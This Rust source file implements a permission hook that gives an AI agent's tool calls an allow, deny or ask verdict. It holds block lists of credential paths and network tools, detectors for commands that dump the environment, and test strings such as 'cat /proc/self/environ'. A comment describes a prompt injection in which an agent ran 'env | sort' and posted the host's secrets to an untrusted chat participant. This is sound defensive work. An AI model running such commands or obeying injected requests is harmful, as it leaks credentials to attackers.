//! Claude-Code-style auto-mode permission engine (pearl th-515a13).
//!
//! This is the **primary tool-execution enforcement layer** now that the
//! microVM stack (Wonk/Goalie) is gone (PR #124). It sits on the engine's
//! [`ToolHook`] chain and gives every tool call a three-way verdict —
//! **allow / deny / ask** — modelled on Claude Code's `auto-mode` config
//! (<https://code.claude.com/docs/en/auto-mode-config>).
//!
//! ## What runs where
//!
//! - [`decide`] is the **pure, deterministic** rule evaluator — no async,
//!   no I/O. It is the security-critical core and is exhaustively tested
//!   (including adversarial compound-command / credential-path inputs).
//! - [`AutoModeHook`] is the async [`ToolHook`] wrapper. On an `Ask`
//!   verdict it files a pending request into the (already-built)
//!   [`AccessStore`] ask channel, waits for a human, and — on approval —
//!   persists the grant at the chosen [`Scope`] via
//!   [`crate::wonk_grants`]. It **fails closed**: a denied, timed-out, or
//!   unattended (headless) `Ask` blocks the call.
//!
//! ## Layered policy sources (reused, not reinvented)
//!
//! The verdict stacks three existing primitives:
//!
//! 1. [`smooth_narc::judge::rule_engine_decide`] — compiled-in baseline:
//!    dangerous CLI substrings / dangerous domains → **deny**;
//!    obviously-safe domains → **allow**.
//! 2. [`crate::wonk_grants::WonkGrants`] — user, project, and session
//!    (in-memory) allow-lists (`~/.smooth/wonk-allow.toml` plus
//!    `<repo>/.smooth/wonk-allow.toml`), merged into [`SharedWonkGrants`].
//! 3. Compiled-in **default posture** — read-only commands allow, mutating
//!    ones ask, credential paths deny.
//!
//! Precedence is **deny > allow > ask** (deny always wins — stricter and
//! safer than a pure "narrowest-scope-wins" merge, and matches Claude
//! Code, where a `deny` rule can't be overridden by an `allow`).

use std::path::PathBuf;
use std::sync::Mutex;
use std::time::Duration;

use async_trait::async_trait;
use smooth_narc::access_wire::{NewAccessRequest, ResolutionVerdict};
use smooth_narc::judge::{domain_matches_suffix_list, rule_engine_decide, Decision, JudgeKind, JudgeRequest, Scope, DANGEROUS_DOMAIN_SUFFIXES};
use smooth_operator::tool::{ToolCall, ToolHook};

use crate::access::AccessStore;
use crate::wonk_grants::{append_grant, project_grants_path, user_grants_path, SharedWonkGrants, WonkGrants};

/// How aggressively the hook enforces. Mirrors the Claude Code mode set,
/// trimmed to what this pearl needs.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum AutoMode {
    /// Full engine: read-only allow, mutating ask, dangerous deny. Default.
    #[default]
    Ask,
    /// Like [`AutoMode::Ask`] but filesystem-edit tools (the `Write`
    /// category — `file_write` / `edit` / `apply_patch` / `create_file`)
    /// auto-approve instead of asking. Everything else (bash, network,
    /// unknown tools) still follows the full [`AutoMode::Ask`] engine, and
    /// the hard denies (credential paths, `rm -rf /`, dangerous domains)
    /// still block. Mirrors Claude Code's `acceptEdits`.
    AcceptEdits,
    /// Like [`AutoMode::Ask`] but never asks — an unmatched verdict is a
    /// **deny** (fail-closed). This is the headless / CI posture (Claude
    /// Code's `dontAsk`).
    DenyUnmatched,
    /// Allow everything **except** the hard baseline denies (`rm -rf /`,
    /// dangerous domains, credential paths). Escape hatch equivalent to
    /// Claude Code's `bypassPermissions`, which keeps its circuit-breakers.
    Bypass,
}

impl AutoMode {
    /// Parse the `SMOOTH_AUTO_MODE` env value. Unknown / unset → `Ask`.
    #[must_use]
    pub fn from_env_value(v: Option<&str>) -> Self {
        match v.map(|s| s.trim().to_ascii_lowercase().replace(['-', '_'], "")).as_deref() {
            Some("deny" | "denyunmatched" | "dontask" | "headless") => Self::DenyUnmatched,
            Some("bypass" | "bypasspermissions" | "yolo") => Self::Bypass,
            Some("acceptedits" | "acceptedit" | "edits") => Self::AcceptEdits,
            _ => Self::Ask,
        }
    }
}

/// The pure verdict returned by [`decide`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Let the call through.
    Allow,
    /// Block the call. Carries a human/LLM-readable reason.
    Deny(String),
    /// Pause and ask a human. Carries everything the ask channel + the
    /// grant persistence need.
    Ask(AskRequest),
}

/// The details of an `Ask` verdict — what to show the human and, on
/// approval, what to persist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AskRequest {
    /// `wonk-allow.toml` grant kind: `network` / `cli` / `tool`.
    pub grant_kind: &'static str,
    /// The exact entry that a grant would persist (host, bash prefix, or
    /// tool name).
    pub grant_entry: String,
    /// The resource shown to the human (the full command / url / tool).
    pub resource: String,
    /// Why we're asking.
    pub reason: String,
}

/// Read-only command binaries that are always safe to run without asking.
/// Kept deliberately tight — anything not here (that isn't explicitly
/// dangerous or granted) falls through to `Ask`.
const SAFE_BASH_BINS: &[&str] = &[
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "rg",
    "fd",
    "find",
    "echo",
    "pwd",
    "which",
    "whoami",
    "date",
    // NB: `env` / `printenv` are deliberately NOT here — they dump the
    // process environment (a secret store), caught by `dumps_environment`
    // and denied. See pearl th-08f304.
    "true",
    "test",
    "dirname",
    "basename",
    "realpath",
    "stat",
    "file",
    "cksum",
    "sha256sum",
    "md5sum",
];

/// `git` subcommands that only read. `git <these>` is safe; any other
/// `git` subcommand (push, commit, reset, clean, …) falls through to Ask.
const SAFE_GIT_SUBCOMMANDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "branch",
    "remote",
    "rev-parse",
    "describe",
    "blame",
    "ls-files",
    // NB: `config` is deliberately NOT here — `git config` both writes
    // (persistence primitives like core.fsmonitor / core.sshCommand run
    // commands) and dumps credentials embedded in remote URLs. It falls to
    // Ask. `branch` / `remote` are listing-only via GIT_LIST_ONLY_FLAGS
    // (pearl th-85d481).
];

/// Flags under which `git branch` / `git remote` stay read-only. Any other
/// argument (`-D x`, `add origin …`, `set-url …`) makes them mutating →
/// fall through to Ask.
const GIT_LIST_ONLY_FLAGS: &[&str] = &[
    "-a",
    "-r",
    "-v",
    "-vv",
    "--all",
    "--list",
    "--verbose",
    "--show-current",
    "--merged",
    "--no-merged",
];

/// Binaries that make outbound network requests — we extract a host from
/// their arguments and run the network rules on it.
const NET_BASH_BINS: &[&str] = &["curl", "wget", "http", "https", "nc", "ncat", "telnet"];

/// Substrings that mean "this command touches a credential / sensitive
/// path". A match is an immediate **deny** — reading these to exfil is the
/// lethal-trifecta risk the pearl calls out, so we block read *and* write.
const SENSITIVE_PATH_SUBSTRINGS: &[&str] = &[
    ".ssh/",
    ".aws/credentials",
    ".aws/config",
    ".config/gh/",
    ".config/gcloud",
    ".gnupg",
    ".kube/config",
    ".docker/config.json",
    ".npmrc",
    ".pypirc",
    ".netrc",
    "/etc/shadow",
    "id_rsa",
    "id_ed25519",
    // smooth's OWN secret stores — LLM API keys and the cached smoo.ai JWT.
    // The env-leak incident (th-08f304) proved the agent's host identity is
    // a target; these were readable via plain `cat` (pearl th-85d481).
    ".smooth/providers.json",
    ".smooth/auth/",
];

/// Split a shell command line into subcommands on the operators that
/// sequence independent commands: `&&`, `||`, `;`, `|`, `&`, and newlines.
/// Every resulting segment must clear the policy on its own — this is what
/// stops `ls && rm -rf /` from riding in on `ls`'s coattails.
fn split_compound(command: &str) -> Vec<String> {
    // Replace the two-char operators with a single sentinel first, then
    // split on the single-char ones. Cheap and good enough — we are not
    // building a shell parser, just refusing to treat a compound line as
    // one atom. ponytail: substring split, upgrade to a real lexer only
    // if quoting edge-cases (`echo "a && b"`) start mattering for policy.
    let mut normalized = command.replace("&&", "\u{1}").replace("||", "\u{1}");
    // Command / process substitution executes its inner text — surface it as
    // its own segment so `echo $(env)` can't ride in on `echo`'s safe-bin
    // status (pearl th-85d481). `)` only becomes a separator when an opener
    // is present, so `grep "(foo)" f` keeps its parens. ponytail: `$(( ))`
    // arithmetic false-positives into an Ask segment — fail-safe, live with it.
    if normalized.contains("$(") || normalized.contains("<(") || normalized.contains('`') {
        normalized = normalized.replace("$(", "\u{1}").replace("<(", "\u{1}").replace(['`', ')'], "\u{1}");
    }
    normalized
        .split(['\u{1}', ';', '|', '&', '\n'])
        // Quote chars left dangling at a segment boundary (`echo "$(printenv)"`
        // → `printenv"`) are shell syntax debris — strip them so the policy
        // sees the bare command.
        .map(|s| s.trim().trim_matches(['"', '\'']).trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Strip leading command wrappers that don't change what actually runs
/// (`timeout 5 curl …` → `curl …`). Mirrors the subset Claude Code strips.
fn strip_wrappers(tokens: &[&str]) -> usize {
    const WRAPPERS: &[&str] = &["timeout", "nice", "nohup", "stdbuf", "env"];
    let mut i = 0;
    while i < tokens.len() && WRAPPERS.contains(&tokens[i]) {
        // Skip the wrapper token and any of its flag/value args until we
        // hit the real command. For `timeout 5 curl` we skip `timeout`
        // and the bare `5`; we stop at the first token that looks like a
        // command (no leading digit / dash).
        i += 1;
        while i < tokens.len() && (tokens[i].starts_with('-') || tokens[i].chars().next().is_some_and(|c| c.is_ascii_digit())) {
            i += 1;
        }
    }
    i
}

/// Extract candidate hostnames from a single (already split) net-tool
/// subcommand. Returns lowercased bare hostnames (no scheme, port, or
/// path). Empty if the binary isn't a net tool.
fn extract_hosts(subcommand: &str) -> Vec<String> {
    let tokens: Vec<&str> = subcommand.split_whitespace().collect();
    let start = strip_wrappers(&tokens);
    let Some(&bin) = tokens.get(start) else { return Vec::new() };
    if !NET_BASH_BINS.contains(&bin) {
        return Vec::new();
    }
    let mut hosts = Vec::new();
    for tok in &tokens[start + 1..] {
        if tok.starts_with('-') {
            continue; // flag
        }
        if let Some(host) = host_from_token(tok) {
            hosts.push(host);
        }
    }
    hosts
}

/// Pull a bare hostname out of a URL-ish or `host:port` token.
fn host_from_token(tok: &str) -> Option<String> {
    // Strip a scheme if present.
    let after_scheme = tok.split_once("://").map_or(tok, |(_, rest)| rest);
    // Host ends at the first '/', ':', '?', or '@'-preceded userinfo.
    let after_userinfo = after_scheme.rsplit_once('@').map_or(after_scheme, |(_, rest)| rest);
    let host = after_userinfo.split(['/', ':', '?', '#']).next().unwrap_or("");
    let host = host.trim();
    // Reject anything that isn't plausibly a hostname (must contain a dot
    // or be localhost) so `curl -X POST` values and file paths don't get
    // treated as hosts.
    if host.is_empty() {
        return None;
    }
    if host == "localhost" || (host.contains('.') && !host.starts_with('.') && !host.ends_with('.')) {
        Some(host.to_ascii_lowercase())
    } else {
        None
    }
}

/// First meaningful token of a subcommand (after stripping wrappers).
fn command_bin(subcommand: &str) -> Option<String> {
    let tokens: Vec<&str> = subcommand.split_whitespace().collect();
    let start = strip_wrappers(&tokens);
    tokens.get(start).map(|s| (*s).to_string())
}

/// Is this single subcommand a compiled-in safe read-only command?
fn is_safe_readonly_bash(subcommand: &str) -> bool {
    let Some(bin) = command_bin(subcommand) else { return false };
    if bin == "find" {
        // `find` is read-only EXCEPT under the action flags: -exec/-ok run an
        // arbitrary command (an env-dump or worse rides in on find's safe-bin
        // status), -delete mutates, -fprint* write files (pearl th-85d481).
        const FIND_ACTION_FLAGS: &[&str] = &["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprintf", "-fls"];
        return !subcommand.split_whitespace().any(|t| FIND_ACTION_FLAGS.contains(&t));
    }
    if SAFE_BASH_BINS.contains(&bin.as_str()) {
        return true;
    }
    if bin == "git" {
        // `git <subcommand>` — only the read-only subcommands are safe.
        let tokens: Vec<&str> = subcommand.split_whitespace().collect();
        let start = strip_wrappers(&tokens);
        // token after `git`, skipping global `-c key=val` / `-C dir` flags.
        let mut j = start + 1;
        while j < tokens.len() && tokens[j].starts_with('-') {
            j += 2; // `-c key=val` style: skip flag + value. Coarse but safe (falls to Ask if wrong).
        }
        if let Some(sub) = tokens.get(j) {
            if !SAFE_GIT_SUBCOMMANDS.contains(sub) {
                return false;
            }
            // `branch` / `remote` mutate under non-listing args (`-D x`,
            // `add origin …`) — bare or listing-flag forms only.
            if *sub == "branch" || *sub == "remote" {
                return tokens[j + 1..].iter().all(|t| GIT_LIST_ONLY_FLAGS.contains(t));
            }
            return true;
        }
        return false;
    }
    false
}

/// Does the command string reference a sensitive credential path?
fn references_sensitive_path(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    if SENSITIVE_PATH_SUBSTRINGS.iter().any(|p| lower.contains(&p.to_ascii_lowercase())) {
        return true;
    }
    // `.env` / `.envrc` / `.env.local` dotenv files are secret stores too
    // (pearl th-85d481). Token-scoped rather than a bare `.env` substring so
    // `rg "process.env" src/` isn't flagged: the token itself must be an
    // env-file path (starts with `.env`, or `.env` after a `/`).
    lower.split_whitespace().any(|t| {
        let t = t.trim_matches(['"', '\'', '(', ')', ';']);
        t.starts_with(".env") || t.contains("/.env")
    })
}

/// Env-var names whose value expansion (`$NAME`) is treated as a secret
/// exfiltration when echoed/printed. Substring match, case-insensitive.
const SENSITIVE_VAR_FRAGMENTS: &[&str] = &[
    "secret",
    "token",
    "password",
    "passwd",
    "api_key",
    "apikey",
    "access_key",
    "credential",
    "private_key",
    "aws_",
    "ssh_",
    "session",
];

/// Does this single (already split) subcommand reveal the process
/// environment? Matches on INTENT rather than a single binary name, since
/// `env` is only one spelling of the exfil (pearl th-08f304). Returns true
/// for:
/// - `env` with no command to exec (bare, piped, or only `-i`/`-u`/assignments)
/// - `printenv` (any form — bare dumps all, `printenv VAR` reveals one)
/// - bare `export` / `export -p`, `declare -p`, `typeset -p`, `set` (no args)
/// - reading `/proc/<pid>/environ`
/// - `echo`/`printf` expanding a sensitively-named `$VAR`
///
/// Deliberately does NOT match the legitimate setter forms: `env FOO=bar cmd`,
/// `export FOO=bar`, `set -euo pipefail`, `declare -i x=5`.
fn dumps_environment(subcommand: &str) -> bool {
    let toks: Vec<&str> = subcommand.split_whitespace().collect();
    if toks.is_empty() {
        return false;
    }

    // `/proc/<pid>/environ` (or /proc/self/environ) read by any tool.
    let lower = subcommand.to_ascii_lowercase();
    if lower.contains("proc/") && lower.contains("/environ") {
        return true;
    }

    // Skip transparent wrappers that aren't themselves env-revealing
    // (timeout/nice/nohup/stdbuf) — but NOT `env`, which is the subject here.
    let mut i = 0;
    while i < toks.len() && matches!(toks[i], "timeout" | "nice" | "nohup" | "stdbuf") {
        i += 1;
        while i < toks.len() && (toks[i].starts_with('-') || toks[i].chars().next().is_some_and(|c| c.is_ascii_digit())) {
            i += 1;
        }
    }
    let Some(&bin) = toks.get(i) else { return false };
    let rest = &toks[i + 1..];

    match bin {
        // printenv always reveals the environment (all vars, or a named one).
        "printenv" => true,
        // `env` reveals the environment UNLESS it's the setter form
        // `env [-i] [-u NAME]... [NAME=value]... command`. It's a dump when
        // no bare command token follows the options/assignments. `-u`/`-S`
        // consume the next token, so skip it before looking for a command.
        "env" => {
            let mut k = 0;
            while k < rest.len() {
                let t = rest[k];
                if t == "-u" || t == "-S" {
                    k += 2; // flag + its value (the var name / string)
                } else if t.starts_with('-') || t.contains('=') || t == "-" {
                    k += 1; // bare option or NAME=value assignment
                } else {
                    return false; // a bare command token → setter form, not a dump
                }
            }
            true
        }
        // `export` / `declare` / `typeset` dump only in their no-assignment
        // listing forms (`export`, `export -p`, `declare -p`, `declare -x`).
        "export" | "declare" | "typeset" => !rest.iter().any(|t| t.contains('=')) && rest.iter().all(|t| t.starts_with('-')),
        // Bare `set` prints all shell + env vars; `set -e`/`set -o …` don't.
        "set" => rest.is_empty(),
        // `echo`/`printf` of a sensitively-named variable expansion.
        "echo" | "printf" => contains_sensitive_var_expansion(subcommand),
        _ => false,
    }
}

/// True if the text contains a `$NAME` / `${NAME}` expansion whose name
/// matches a [`SENSITIVE_VAR_FRAGMENTS`] fragment.
fn contains_sensitive_var_expansion(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut idx = 0;
    while let Some(rel) = lower[idx..].find('$') {
        let start = idx + rel + 1;
        let mut j = start;
        if bytes.get(j) == Some(&b'{') {
            j += 1;
        }
        let name_start = j;
        while j < bytes.len() && (bytes[j].is_ascii_alphanumeric() || bytes[j] == b'_') {
            j += 1;
        }
        let name = &lower[name_start..j];
        if !name.is_empty() && SENSITIVE_VAR_FRAGMENTS.iter().any(|f| name.contains(f)) {
            return true;
        }
        idx = start;
    }
    false
}

/// Evaluate a single bash subcommand against the layered policy.
fn decide_bash_subcommand(subcommand: &str, grants: &WonkGrants) -> Verdict {
    // 1. Credential-path guard — deny read AND write (exfil risk).
    if references_sensitive_path(subcommand) {
        return Verdict::Deny(format!("command references a sensitive credential path: {subcommand}"));
    }

    // 1b. Environment-dump guard (pearl th-08f304). The process environment
    // is a secret store (API tokens, SSH_CONNECTION topology, …), so a
    // command that reveals it is an exfiltration primitive — same risk
    // class as reading ~/.aws/credentials, and NOT made safe by the fact
    // that it touches no file. A grandma-pretext prompt injection got the
    // chat agent to run `env | sort` and post the host environment to an
    // untrusted chat participant precisely because `env`/`printenv` were on
    // the safe-read-only allowlist. Deny, like the credential-path guard.
    if dumps_environment(subcommand) {
        return Verdict::Deny(format!(
            "command reveals the process environment (secret/credential exfiltration risk): {subcommand}"
        ));
    }

    // 2. Baseline dangerous-CLI deny (rm -rf /, curl | sh, fork bomb, …).
    let cli_req = JudgeRequest {
        kind: JudgeKind::Cli,
        operator_id: String::new(),
        bead_id: String::new(),
        phase: String::new(),
        resource: subcommand.to_string(),
        detail: None,
        task_summary: None,
        agent_reason: None,
    };
    if let Some(d) = rule_engine_decide(&cli_req) {
        if d.decision == Decision::Deny {
            return Verdict::Deny(d.reason);
        }
    }

    // 3. Network hosts referenced by this subcommand.
    let hosts = extract_hosts(subcommand);
    for host in &hosts {
        // Dangerous domain → deny outright.
        if domain_matches_suffix_list(host, DANGEROUS_DOMAIN_SUFFIXES) {
            return Verdict::Deny(format!("{host} is on the dangerous-domain deny list"));
        }
    }
    for host in &hosts {
        let net_req = JudgeRequest {
            kind: JudgeKind::Network,
            operator_id: String::new(),
            bead_id: String::new(),
            phase: String::new(),
            resource: host.clone(),
            detail: None,
            task_summary: None,
            agent_reason: None,
        };
        let safe_domain = matches!(rule_engine_decide(&net_req).map(|d| d.decision), Some(Decision::Approve));
        if !safe_domain && !grants.matches_host(host) {
            // A network host we don't already trust → ask, persisting the
            // host (not the whole bash prefix, which would be too broad).
            return Verdict::Ask(AskRequest {
                grant_kind: "network",
                grant_entry: host.clone(),
                resource: subcommand.to_string(),
                reason: format!("outbound request to {host} is not in the allow-list"),
            });
        }
    }

    // 4. Net tool whose every host cleared the egress check → allow. For a
    // fetch tool the network destination *is* the thing we gate on, so once
    // all hosts are granted/safe (we got past the loop above without an ask)
    // there is nothing left to prompt about — otherwise a granted host would
    // still re-ask on the `curl ` prefix, defeating the grant.
    let bin = command_bin(subcommand).unwrap_or_default();
    if !hosts.is_empty() && NET_BASH_BINS.contains(&bin.as_str()) {
        return Verdict::Allow;
    }

    // 5. Granted bash prefix, or compiled-in safe read-only command → allow.
    if grants.matches_bash(subcommand) || is_safe_readonly_bash(subcommand) {
        return Verdict::Allow;
    }

    // 6. Unmatched mutating command → ask, persisting a `<bin> ` prefix.
    Verdict::Ask(AskRequest {
        grant_kind: "cli",
        grant_entry: format!("{bin} "),
        resource: subcommand.to_string(),
        reason: format!("`{bin}` is not a known-safe command and has no grant"),
    })
}

/// Evaluate a whole (possibly compound) bash command line. Every
/// subcommand must clear on its own; the strictest verdict wins
/// (deny > ask > allow).
fn decide_bash(command: &str, grants: &WonkGrants) -> Verdict {
    let subs = split_compound(command);
    if subs.is_empty() {
        return Verdict::Deny("empty command".into());
    }
    let mut pending_ask: Option<AskRequest> = None;
    for sub in &subs {
        match decide_bash_subcommand(sub, grants) {
            Verdict::Deny(r) => return Verdict::Deny(r), // any deny sinks the whole line
            Verdict::Ask(a) => {
                if pending_ask.is_none() {
                    pending_ask = Some(a); // ask about the first unresolved segment
                }
            }
            Verdict::Allow => {}
        }
    }
    pending_ask.map_or(Verdict::Allow, Verdict::Ask)
}

/// Category a tool falls into, derived from its name. Drives the default
/// posture for tools that aren't bash.
fn tool_category(name: &str) -> Category {
    let n = name.to_ascii_lowercase();
    if n == "bash" || n == "shell" || n == "shell_exec" || n == "run_command" {
        Category::Bash
    } else if n.starts_with("pearls_") || n.starts_with("teammate_") || n == "web_search" {
        // Internal orchestration + read-only search tools — safe.
        Category::Safe
    } else if n.contains("write") || n.contains("edit") || n.contains("delete") || n.contains("remove") || n == "apply_patch" || n == "create_file" {
        Category::Write
    } else if n.contains("fetch") || n.contains("download") || n.starts_with("http") {
        Category::Network
    } else if n.starts_with("read") || n.starts_with("list") || n.starts_with("get") || n.contains("search") || n == "grep" || n == "glob" {
        Category::Safe
    } else {
        Category::Unknown
    }
}

enum Category {
    Bash,
    Network,
    Write,
    Safe,
    Unknown,
}

/// The pure, deterministic permission decision. No async, no I/O — this is
/// the security-critical core, tested exhaustively below.
///
/// `args` is the raw tool-call argument object; the relevant field is
/// pulled per category (`cmd` for bash, `path` for writes, `url`/`host`
/// for network).
#[must_use]
pub fn decide(mode: AutoMode, tool_name: &str, args: &serde_json::Value, grants: &WonkGrants) -> Verdict {
    // Bypass still honours the hard baseline denies (dangerous CLI,
    // dangerous domains, credential paths) — evaluate, then downgrade any
    // Ask to Allow.
    let raw = decide_inner(tool_name, args, grants);
    match (mode, raw) {
        (_, Verdict::Deny(r)) => Verdict::Deny(r),
        (AutoMode::Bypass, _) => Verdict::Allow,
        // acceptEdits: filesystem-edit tools auto-approve; a sensitive-path
        // write already came back Deny above, so this only lifts benign
        // edits. bash / network / unknown-tool asks are untouched.
        (AutoMode::AcceptEdits, Verdict::Ask(_)) if matches!(tool_category(tool_name), Category::Write) => Verdict::Allow,
        (AutoMode::DenyUnmatched, Verdict::Ask(a)) => Verdict::Deny(format!("auto-mode headless: {} (no interactive approver)", a.reason)),
        (_, other) => other,
    }
}

fn decide_inner(tool_name: &str, args: &serde_json::Value, grants: &WonkGrants) -> Verdict {
    match tool_category(tool_name) {
        Category::Bash => {
            let cmd = args.get("cmd").or_else(|| args.get("command")).and_then(|v| v.as_str()).unwrap_or("").trim();
            if cmd.is_empty() {
                return Verdict::Deny("bash call with no command".into());
            }
            decide_bash(cmd, grants)
        }
        Category::Safe => {
            // Read-only is not exfil-proof: the read path IS the exfil path
            // (pearl th-85d481). Same credential-path circuit-breaker as bash
            // `cat` and the Write category, applied to the path-ish args.
            for key in ["path", "file", "dir", "directory"] {
                if let Some(v) = args.get(key).and_then(|v| v.as_str()) {
                    if references_sensitive_path(v) {
                        return Verdict::Deny(format!("{tool_name} targets a sensitive credential path: {v}"));
                    }
                }
            }
            Verdict::Allow
        }
        Category::Network => {
            let url = args.get("url").or_else(|| args.get("host")).and_then(|v| v.as_str()).unwrap_or("");
            let host = host_from_token(url).unwrap_or_else(|| url.to_string());
            if host.is_empty() {
                return Verdict::Deny(format!("{tool_name} call with no url/host"));
            }
            if domain_matches_suffix_list(&host, DANGEROUS_DOMAIN_SUFFIXES) {
                return Verdict::Deny(format!("{host} is on the dangerous-domain deny list"));
            }
            let net_req = JudgeRequest {
                kind: JudgeKind::Network,
                operator_id: String::new(),
                bead_id: String::new(),
                phase: String::new(),
                resource: host.clone(),
                detail: None,
                task_summary: None,
                agent_reason: None,
            };
            if matches!(rule_engine_decide(&net_req).map(|d| d.decision), Some(Decision::Approve)) || grants.matches_host(&host) {
                return Verdict::Allow;
            }
            Verdict::Ask(AskRequest {
                grant_kind: "network",
                grant_entry: host.clone(),
                resource: format!("{tool_name} {host}"),
                reason: format!("outbound request to {host} is not in the allow-list"),
            })
        }
        Category::Write => {
            let path = args.get("path").or_else(|| args.get("file")).and_then(|v| v.as_str()).unwrap_or("");
            if references_sensitive_path(path) {
                return Verdict::Deny(format!("write to a sensitive credential path: {path}"));
            }
            if grants.matches_tool(tool_name) {
                return Verdict::Allow;
            }
            Verdict::Ask(AskRequest {
                grant_kind: "tool",
                grant_entry: tool_name.to_string(),
                resource: format!("{tool_name} {path}"),
                reason: format!("`{tool_name}` mutates the filesystem"),
            })
        }
        Category::Unknown => {
            if grants.matches_tool(tool_name) {
                return Verdict::Allow;
            }
            Verdict::Ask(AskRequest {
                grant_kind: "tool",
                grant_entry: tool_name.to_string(),
                resource: tool_name.to_string(),
                reason: format!("`{tool_name}` is not a recognised safe tool"),
            })
        }
    }
}

// ---------------------------------------------------------------------------
// The hook
// ---------------------------------------------------------------------------

/// Default time a held tool call waits for a human before failing closed.
const DEFAULT_ASK_TIMEOUT: Duration = Duration::from_secs(300);

/// [`ToolHook`] that enforces [`decide`] on every tool call, files `Ask`
/// verdicts into the [`AccessStore`], and persists approvals.
pub struct AutoModeHook {
    mode: AutoMode,
    access: AccessStore,
    grants: SharedWonkGrants,
    /// Workspace root — used to locate `<repo>/.smooth/wonk-allow.toml`
    /// for `PearlProject`-scoped grants.
    workspace: PathBuf,
    operator_id: String,
    bead_id: String,
    ask_timeout: Duration,
    /// In-memory audit of the verdicts this hook produced (for tests +
    /// diagnostics). Bounded — we only keep the most recent entries.
    log: Mutex<Vec<(String, String)>>,
}

impl AutoModeHook {
    /// Build a hook from live [`AppState`](crate::server::AppState) handles.
    #[must_use]
    pub fn new(mode: AutoMode, access: AccessStore, grants: SharedWonkGrants, workspace: PathBuf) -> Self {
        Self {
            mode,
            access,
            grants,
            workspace,
            operator_id: "operator".into(),
            bead_id: "chat".into(),
            ask_timeout: DEFAULT_ASK_TIMEOUT,
            log: Mutex::new(Vec::new()),
        }
    }

    /// Override the identifiers surfaced in the ask card.
    #[must_use]
    pub fn with_identity(mut self, operator_id: impl Into<String>, bead_id: impl Into<String>) -> Self {
        self.operator_id = operator_id.into();
        self.bead_id = bead_id.into();
        self
    }

    /// Override the ask timeout (tests use a short one).
    #[must_use]
    pub fn with_ask_timeout(mut self, timeout: Duration) -> Self {
        self.ask_timeout = timeout;
        self
    }

    fn record(&self, tool: &str, outcome: &str) {
        let mut log = self.log.lock().unwrap_or_else(|e| e.into_inner());
        log.push((tool.to_string(), outcome.to_string()));
        // Keep the audit bounded.
        if log.len() > 256 {
            let drop = log.len() - 256;
            log.drain(0..drop);
        }
    }

    /// Snapshot of `(tool, outcome)` verdicts produced so far.
    #[must_use]
    pub fn audit(&self) -> Vec<(String, String)> {
        self.log.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Persist an approved grant at the resolved scope. `Once` and
    /// `Session` don't touch disk; `Session` merges into the shared
    /// in-memory grants; `PearlProject` / `User` append to the
    /// corresponding `wonk-allow.toml` and merge the result back in.
    fn persist_grant(&self, ask: &AskRequest, scope: Scope, glob_override: Option<&str>) {
        // Every scope except Once updates the live in-memory grants so the
        // very next call in this process sees the approval.
        let mut mem = WonkGrants::new();
        match ask.grant_kind {
            "network" => mem.add_host(glob_override.unwrap_or(&ask.grant_entry).to_string()),
            "cli" => mem.add_bash_pattern(ask.grant_entry.clone()),
            _ => mem.add_tool(ask.grant_entry.clone()),
        }

        match scope {
            Scope::Once => {} // nothing persisted — this call is allowed, next one re-asks
            Scope::Session => self.grants.merge_in(mem),
            Scope::PearlProject => {
                let path = project_grants_path(&self.workspace);
                if let Err(e) = append_grant(&path, ask.grant_kind, &ask.grant_entry, glob_override) {
                    tracing::warn!(error = %e, path = %path.display(), "auto-mode: failed to persist project grant");
                }
                self.grants.merge_in(mem);
            }
            Scope::User => {
                if let Some(path) = user_grants_path() {
                    if let Err(e) = append_grant(&path, ask.grant_kind, &ask.grant_entry, glob_override) {
                        tracing::warn!(error = %e, path = %path.display(), "auto-mode: failed to persist user grant");
                    }
                }
                self.grants.merge_in(mem);
            }
        }
    }
}

#[async_trait]
impl ToolHook for AutoModeHook {
    async fn pre_call(&self, call: &ToolCall) -> anyhow::Result<()> {
        let grants = self.grants.snapshot();
        match decide(self.mode, &call.name, &call.arguments, &grants) {
            Verdict::Allow => {
                self.record(&call.name, "allow");
                Ok(())
            }
            Verdict::Deny(reason) => {
                self.record(&call.name, "deny");
                anyhow::bail!("permission denied: {reason}");
            }
            Verdict::Ask(ask) => {
                // File the request and wait for a human on the ask channel.
                let mut req = NewAccessRequest::with_defaults(&self.bead_id, &self.operator_id, ask.grant_kind, &ask.resource, &ask.reason);
                req.detail = Some(ask.resource.clone());
                let (id, fut) = self.access.file_pending(req);

                let resolution = fut.await_resolution_with_timeout(self.ask_timeout).await;
                match resolution {
                    Some(res) if res.verdict == ResolutionVerdict::Approve => {
                        self.persist_grant(&ask, res.scope, res.glob_override.as_deref());
                        self.record(&call.name, "ask:approved");
                        Ok(())
                    }
                    Some(_) => {
                        self.record(&call.name, "ask:denied");
                        anyhow::bail!("permission denied by human: {}", ask.reason);
                    }
                    None => {
                        // Timed out / no approver — fail closed. Clear the
                        // dangling pending entry so the queue doesn't leak.
                        let _ = self.access.expire(&id);
                        self.record(&call.name, "ask:timeout");
                        anyhow::bail!("permission request timed out (fail-closed): {}", ask.reason);
                    }
                }
            }
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use serde_json::json;

    fn empty_grants() -> WonkGrants {
        WonkGrants::new()
    }

    fn bash(cmd: &str) -> serde_json::Value {
        json!({ "cmd": cmd })
    }

    // ── environment-dump guard (pearl th-08f304) ───────────────────

    #[test]
    fn env_dump_forms_are_detected() {
        for cmd in [
            "env",
            "env | sort",  // the live incident command
            "env|sort",    // split yields "env"
            "env -i",      // still a dump (no command follows)
            "env -u PATH", // still a dump
            "printenv",
            "printenv PATH", // reveals a specific var
            "printenv AWS_SECRET_ACCESS_KEY",
            "export",
            "export -p",
            "declare -p",
            "declare -x",
            "typeset -p",
            "set",
            "cat /proc/self/environ",
            "cat /proc/1234/environ",
            "xxd /proc/self/environ",
            "echo $AWS_SECRET_ACCESS_KEY",
            "echo \"token: $GITHUB_TOKEN\"",
            "printf '%s' \"${DATABASE_PASSWORD}\"",
            "echo $SSH_CONNECTION",
